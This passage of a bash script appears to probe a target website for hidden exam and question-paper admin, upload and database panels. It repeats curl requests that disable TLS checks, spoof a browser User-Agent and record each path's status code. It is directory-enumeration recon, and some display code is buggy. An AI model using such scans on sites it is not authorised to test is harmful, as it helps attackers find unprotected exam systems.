echo -n "Payload ["QPBatch-BatchUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBatch-BatchUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPB_BatchProcessor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPB_BatchProcessor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPFile-Panel/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPFile-Panel/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QuestionPaper-MassUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QuestionPaper-MassUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAdminProcessingSuite/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAdminProcessingSuite/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPHandler_Automation/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPHandler_Automation/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPProcessingPanel/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPProcessingPanel/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Admin-QPCloud/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Admin-QPCloud/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPDatabaseControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPDatabaseControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MonitoringTool_QP/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MonitoringTool_QP/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ProcessingQsnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ProcessingQsnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MonitoringTool_QPBFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MonitoringTool_QPBFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DatabaseManager-QPMaster/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DatabaseManager-QPMaster/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DashboardQPBData/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DashboardQPBData/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMonitorDataOps/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMonitorDataOps/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ProcessingExamPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ProcessingExamPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Automation-QPBFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Automation-QPBFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataProcessing-QPMonitor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataProcessing-QPMonitor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ExamPaper-Portal/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ExamPaper-Portal/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QP_Manager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QP_Manager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ExamPaper-ProcessingSuite/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ExamPaper-ProcessingSuite/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBDataBatchProcessor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBDataBatchProcessor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AutomationQstnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AutomationQstnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPFile-DataProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPFile-DataProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMgmt_Handler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMgmt_Handler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataOpsQPMaster/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataOpsQPMaster/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Platform-QPCloud/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Platform-QPCloud/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataOpsQPAdmin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataOpsQPAdmin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Module_QPFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Module_QPFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BulkUpload_QPMaster/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BulkUpload_QPMaster/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ServiceQ_P/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ServiceQ_P/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AutoUpload-QPWorkflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AutoUpload-QPWorkflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ToolQPWorkflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ToolQPWorkflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMgmt-AutoUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMgmt-AutoUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBulk_MonitoringTool/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBulk_MonitoringTool/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataOps_QPMgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataOps_QPMgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAdmin-Monitoring/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAdmin-Monitoring/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAutoProcessingSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAutoProcessingSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPCloud-MonitoringTool/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPCloud-MonitoringTool/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Module_QsnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Module_QsnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["PortalQPBatch/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"PortalQPBatch/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPHandler_BatchUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPHandler_BatchUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Handling-QPManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Handling-QPManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["TestPaper_DataPipeline/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"TestPaper_DataPipeline/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AutoUpload-QPFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AutoUpload-QPFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPHandler_Tool/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPHandler_Tool/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Admin_QPHandler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Admin_QPHandler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPSystem-Platform/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPSystem-Platform/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPFile_Tool/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPFile_Tool/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Handler-QPBData/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Handler-QPBData/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataProcessingQPSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataProcessingQPSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ProcessingSuite-QPUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ProcessingSuite-QPUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QsnPaper_Sync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QsnPaper_Sync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Platform-QPAuto/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Platform-QPAuto/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DatabaseManager-Q_P/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DatabaseManager-Q_P/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QstnPaper_Portal/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QstnPaper_Portal/"" -H "User-Agent: Mozilla/5.0")
